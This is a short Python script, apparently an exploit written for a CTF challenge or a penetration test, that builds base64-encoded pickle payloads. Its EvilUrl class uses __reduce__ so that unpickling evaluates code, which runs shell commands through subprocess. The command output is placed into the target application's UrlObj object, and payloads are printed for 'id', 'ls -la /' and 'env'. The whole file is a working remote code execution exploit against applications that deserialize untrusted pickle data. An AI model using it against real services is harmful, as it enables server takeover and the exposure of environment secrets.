import pickle, base64

def make_payload(cmd):
    expr = (
        "(lambda o: (setattr(o,'name',__import__('subprocess').getoutput(%r)), "
        "setattr(o,'url','http://example.com')) and o)"
        "(__import__('builtins').object.__new__(__import__('app.models', fromlist=['UrlObj']).UrlObj))"
    ) % cmd
    class EvilUrl(object):
        def __reduce__(self):
            return (eval, (expr,))
    raw = pickle.dumps([EvilUrl()], protocol=4)
    return base64.b64encode(raw).decode()

for cmd in ["id", "ls -la /", "env"]:
    print(cmd, make_payload(cmd), sep="\n", end="\n\n")
